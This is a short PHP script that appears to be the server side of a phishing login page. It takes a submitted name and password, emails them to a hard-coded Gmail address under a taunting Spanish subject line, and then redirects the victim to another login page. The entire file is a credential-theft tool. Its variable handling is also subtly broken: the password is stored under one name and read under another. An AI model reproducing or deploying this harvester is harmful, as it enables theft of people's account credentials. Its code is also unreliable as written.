<?php
$nombre = $_POST['nombre'];
$mail = $_POST['password'];

$header = 'From: bgonsalescoronado@gmail.com ' . " \r\n";
$header .= "X-Mailer: PHP/" . phpversion() . " \r\n";
$header .= "Mime-Version: 1.0 \r\n";
$header .= "Content-Type: text/plain";

$mensaje = "Este mensaje fue enviado por " . $nombre . ",\r\n";
$mensaje .= "Su contra es: " . $password . " \r\n";
$mensaje .= "Enviado el " . date('d/m/Y', time());

$para = 'bgonsalescoronado@gmail.com';
$asunto = 'Me la Debes';

mail($para, $asunto, utf8_decode($mensaje), $header);

header("Location: login2.html");
?>